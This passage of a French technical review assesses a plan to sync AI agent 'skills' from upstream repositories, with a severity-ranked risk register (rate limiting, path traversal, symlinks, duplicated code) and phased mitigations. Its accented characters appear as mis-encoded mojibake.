| Fichiers de test | 4 | 6-7 (+ test_sync_skills.py, + test_skills.py, + extensions cli.test.mjs) |
| Tests unitaires | 176 | ~280-320 |
| Jobs CI | 4 | 5-6 (+ sync.yml jobs) |
| Workflows GitHub Actions | 1 | 2 (ci.yml + sync.yml) |

### Mitigations

1. **Prioriser l'extraction de code partagÃ©** : `sync_common.py` est le meilleur investissement anti-dette du plan.

2. **CrÃ©er un validateur Python partagÃ©** pour agents ET skills (au lieu d'inline Python dans `ci.yml` L78-125). L'actuel validateur inline fait 47 lignes de Python dans un heredoc YAML â€” c'est fragile et non testable. Le dÃ©placer dans `scripts/validate.py` permettrait de :
   - Le tester unitairement
   - L'Ã©tendre pour les skills
   - Le rÃ©utiliser entre `ci.yml` et `sync.yml`

3. **Versionner les schemas de manifest** : ajouter un champ `schema_version: "1.0"` dans `manifest.json` et `skills-manifest.json` pour faciliter les migrations futures.

---

## Risques classÃ©s par sÃ©vÃ©ritÃ©

### ğŸ”´ Critiques (4) â€” Bloquants pour l'implÃ©mentation

| # | Risque | Section | Mitigation |
|---|---|---|---|
| C1 | Duplication ~430 lignes d'infrastructure HTTP/cache/parse | Â§1 | Extraire `sync_common.py` avant T4.1 |
| C2 | `installer.mjs` incompatible avec le download de rÃ©pertoires | Â§6 | Refactoring structurel : `downloadBinary()`, pool concurrent, path guards rÃ©cursifs |
| C3 | Rate limiting sous-estimÃ© (2000+ vs 936) + throttling `raw.githubusercontent.com` sans Retry-After | Â§5 | Fallback 429, dÃ©lai inter-fichier, API blobs alternative |
| C4 | Fichiers `scripts/` exÃ©cutables copiÃ©s depuis source non contrÃ´lÃ©e | Â§9 | Renommer en `.py.txt`, cap taille totale, guard anti-symlink |

### ğŸŸ  Hauts (3)

| # | Risque | Section | Mitigation |
|---|---|---|---|
| H1 | Scoring 5-facteurs impraticable pour v1 | Â§3 | Reporter Ã  Phase 7, utiliser `CURATED_SKILLS` manual |
| H2 | Race condition PR sur branche fixe `sync/upstream-auto` | Â§4 | Label auto-sync, mise Ã  jour PR existante |
| H3 | Tests skills non spÃ©cifiÃ©s (cas limites manquants) | Â§8 | Fixtures 3-archÃ©types, tests path traversal |

### ğŸŸ¡ Moyens (8)

| # | Risque | Section | Mitigation |
|---|---|---|---|
| M1 | Divergence progressive entre scripts dupliquÃ©s | Â§1 | `sync_common.py` (rÃ©solu par C1) |
| M2 | `_raw_get()` dÃ©code UTF-8 systÃ©matiquement (incompatible binaires) | Â§2 | Ajouter `decode=False` option |
| M3 | ParallÃ©lisme CI agents/skills sur mÃªme workspace | Â§4 | Job sÃ©quentiel ou artifacts |
| M4 | Collision de noms agents/skills | Â§7 | PrÃ©fixe `[agent]`/`[skill]` dans les rÃ©sultats |
| M5 | Path traversal multiplicatif (N fichiers par skill) | Â§9 | Guard sur chaque fichier compagnon |
| M6 | Symlinks malicieux dans les skills | Â§9 | Check `is_symlink()` |
| M7 | Taille cumulÃ©e d'un skill non capÃ©e | Â§9 | Cap 5MB total par skill |
| M8 | Validateur CI inline non testable (47 lignes YAML heredoc) | Â§10 | Extraire dans `scripts/validate.py` |

### ğŸŸ¢ Bas (4)

| # | Risque | Section | Mitigation |
|---|---|---|---|
| L1 | Parse YAML nested non supportÃ© | Â§2 | Documenter â€” non bloquant car champs supprimÃ©s |
| L2 | Scoring non dÃ©terministe | Â§3 | Reporter Ã  Phase 7 â€” rÃ©solu par H1 |
| L3 | Frontmatter inconsistant entre skills hand-written | Â§7 | Validateur flexible (champs min) |
| L4 | Cron drift GitHub Actions | Â§4 | Documenter â€” non bloquant |

---

## Recommandations

### PrÃ©-requis (avant de commencer T4.1)

| # | Action | Effort | Impact |
|---|---|---|---|
| **P1** | Extraire `scripts/sync_common.py` depuis `sync-agents.py` (~430 lignes) | 1-2 sessions | Ã‰limine C1 et M1 |
| **P2** | Ajouter fallback 429 sans Retry-After dans `_http_request()` | 30 min | Ã‰limine C3 (partie throttling) |
| **P3** | DÃ©cider du traitement des fichiers `scripts/` : copier tel quel, renommer `.txt`, ou exclure | 15 min (dÃ©cision) | Ã‰limine C4 |

### Phase 4 â€” Ajustements

| # | Action | DÃ©tail |
|---|---|---|
| **A1** | Remplacer le scoring par `CURATED_SKILLS` manuelle | Pattern identique Ã  `CURATED_AGENTS` L120-175 |
| **A2** | Ajouter un `_raw_get_bytes()` pour les fichiers non-texte | Ou paramÃ¨tre `decode=False` |
| **A3** | Path traversal guard sur CHAQUE fichier compagnon | Pas seulement sur le SKILL.md |
| **A4** | Cap taille totale par skill (5MB) | Nouvelle constante `MAX_SKILL_TOTAL_SIZE` |
| **A5** | Check anti-symlink avant Ã©criture | `if path.is_symlink(): raise` |

### Phase 5 â€” Ajustements

| # | Action | DÃ©tail |
|---|---|---|
| **A6** | Job sÃ©quentiel (pas parallÃ¨le) pour sync-agents + sync-skills | Ã‰vite la complexitÃ© des artifacts |
| **A7** | Permissions scopÃ©es au workflow `sync.yml` | `contents:write`, `pull-requests:write` |
| **A8** | Extraire le validateur CI inline dans `scripts/validate.py` | Testable + extensible pour skills |

### Phase 6 â€” Ajustements

| # | Action | DÃ©tail |
|---|---|---|
| **A9** | `skills-manifest.json` doit lister TOUS les fichiers par skill | Indispensable pour que la CLI sache quoi tÃ©lÃ©charger |
| **A10** | CrÃ©er `downloadBinary()` dans `installer.mjs` | Retourne `Buffer` au lieu de `string` |
| **A11** | Pool de download concurrent (max 3) | Ã‰vite les 429 tout en restant raisonnable |
| **A12** | `SAFE_NAME_RE` Ã©tendu pour les chemins de fichiers compagnons | `/^[a-zA-Z0-9][a-zA-Z0-9._\/-]*$/` |

### Vue d'ensemble des dÃ©pendances

```
P1 (sync_common.py) â”€â”€â†’ T4.1 (sync-skills.py)
P2 (429 fallback)   â”€â”€â†’ T4.1
P3 (dÃ©cision scripts/) â†’ T4.1
                          â†“
                    T4.3 (tests skills)
                          â†“
                    T4.4 (manifest) â”€â”€â†’ T6.1 (CLI skills)
                                            â†“
                                      T6.3 (tests CLI)
                                            â†“
A8 (validate.py) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’ T5.1 (sync.yml)
```

---

> **Bottom line technique** : Le plan est rÃ©alisable. Les 4 risques critiques sont tous rÃ©solvables avec des mitigations concrÃ¨tes qui s'appuient sur les patterns existants du codebase. Le plus important est l'extraction de `sync_common.py` â€” c'est le fondation sur laquelle repose tout le reste. Sans cela, le projet accumule de la dette technique dÃ¨s le premier jour de Phase 4.
